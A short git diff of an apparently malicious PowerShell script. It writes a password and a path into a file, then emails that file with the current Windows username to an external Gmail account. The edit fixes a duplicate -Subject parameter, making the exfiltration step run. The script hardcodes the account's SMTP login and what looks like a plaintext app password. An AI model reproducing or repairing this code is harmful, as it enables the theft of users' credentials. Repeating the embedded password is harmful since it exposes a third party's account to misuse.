@@ -46,7 +46,7 @@ Add-Content -Path $configfile -Value $password
 Add-Content -Path $configfile -Value $path
 
 #smtp process
-Send-MailMessage -From "websitepetros@gmail.com" -To "websitepetros@gmail.com" -subject "$env:UserName" -Subject $configfile -Attachment $configfile -SmtpServer "smtp.gmail.com" -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "websitepetros@gmail.com", (ConvertTo-SecureString -String 'tqck alhn siqo dtqz' -AsPlainText -Force))
+Send-MailMessage -From "websitepetros@gmail.com" -To "websitepetros@gmail.com" -subject "$env:UserName" -Attachment $configfile -SmtpServer "smtp.gmail.com" -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "websitepetros@gmail.com", (ConvertTo-SecureString -String 'tqck alhn siqo dtqz' -AsPlainText -Force))
 
 
 
